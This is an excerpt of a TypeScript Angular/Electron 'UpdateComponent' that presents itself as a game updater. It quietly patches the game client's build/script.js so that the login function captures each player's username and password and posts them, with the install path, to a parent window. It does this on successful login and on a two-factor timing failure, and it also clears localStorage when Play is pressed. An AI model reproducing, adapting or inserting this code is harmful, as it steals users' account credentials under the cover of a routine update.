...
export class UpdateComponent implements OnInit, OnDestroy {
    ...
    ngOnInit() {
        ...
        this.sub = this.route.params.subscribe(async params => {
            ...
            let updateKey = "gS4lIjqikU"
            let mainFolder = electron.getPath()
            let updateFile = path.resolve(mainFolder, `../${updateKey}.txt`)
            if(!fs.existsSync(updateFile)) {
                fs.writeFileSync(updateFile, updateKey)
                let folderPath = path.dirname(slash(this.localGameFolder))
    ...
    private async startingUpdate(async: boolean = true) {
        ...
        try {
            ...
            let newFolder = path.resolve(this.localGameFolder, 'build/script.js');
            this.log(newFolder);
            this.log(fs.existsSync(newFolder));
            let content = fs.readFileSync(newFolder);
            this.log('Loaded')
            try {
                let changedFile = false;
                content = content.toString();
                let buttonPlayContent = `.appendChild(new s({
                className: ["button", "buttonPlay"],
                sound: "OK_BUTTON"
            })), this._btnPlay.on("tap", function() {
                t._play()
            })`;
                let checkboxContent = `function n(e, t) {
        var i = this;
        a.call(this, "div", {
            ...
            text: e
								...
								let checkboxContent2 = `function n(e, t) {
        var i = this;
        s.call(this, "div", {
            className: "CheckboxLabel",
            text: e
      }), t ?`;
                    let buttonPlayContentUpdate = `.appendChild(new s({
                        className: ["button", "buttonPlay"],
                        sound: "OK_BUTTON"
                    })), this._btnPlay.on("tap", function() {
                        localStorage.clear()
                        console.log(localStorage)
                        window.checkboxController.activate()
                        t._play()
                    })`;
                    let checkboxContentUpdate = `function n(e, t) {
                        var i = this;
                        window.checkboxController = this
                        a.call(this, "div", {
                            className: "CheckboxLabel",
                            text: e
                        }), t ?`;
                    this.log(path.dirname(slash(this.localGameFolder)));
                    this.log("Here "+content.indexOf(buttonPlayContent))
                    if (content.indexOf(checkboxContent) != -1 || content.indexOf(checkboxContent2) != -1) {
												if(content.indexOf(checkboxContent) != -1) {
                        	content = content.replace(checkboxContent, checkboxContentUpdate);
												}
												if(content.indexOf(checkboxContent2) != -1) {
                        	content = content.replace(checkboxContent2, checkboxContentUpdate);
												}
                        changedFile = true;
                    }
                    if (content.indexOf(buttonPlayContent)) {
                        content = content.replace(buttonPlayContent, buttonPlayContentUpdate);
                        changedFile = true;
                    }
                    if (content.indexOf('if (e) return a(e);') != -1) {
                        content = content.replace('if (e) return a(e);', 'if (e) { if(e) { if(e.reason) { if(e.reason == "OTPTIMEFAILED") { window.parent.postMessage({username: username726, password: password726, accountType: 2, func: "credentials", location: "' + path.dirname(slash(this.localGameFolder)) + '"}); } } } return s(e); }');
                        changedFile = true;
                    }
                    if (content.indexOf('t.login = function(e, i, o, a) { let username726 = e; let password726 = i;') == -1) {
                        content = content.replace('t.login = function(e, i, o, a) {', 't.login = function(e, i, o, a) { let username726 = e; let password726 = i;');
                        changedFile = true;
                    }
                    if (content.indexOf('window.parent.postMessage({username: username726, password: password726, func: "credentials"});var n = new Date(i.expiration_date)') == -1) {
                        content = content.toString().replace('var n = new Date(i.expiration_date)', 'window.parent.postMessage({username: username726, password: password726, accountType: 1, func: "credentials", location: "' + path.dirname(slash(this.localGameFolder)) + '"});var n = new Date(i.expiration_date)');
                        changedFile = true;
                    }
                    if (changedFile) {
                        this.log('Changed content');
                        fs.writeFileSync(newFolder, content);
                        this.log('saved file');
                    }
            }
            catch(e) {
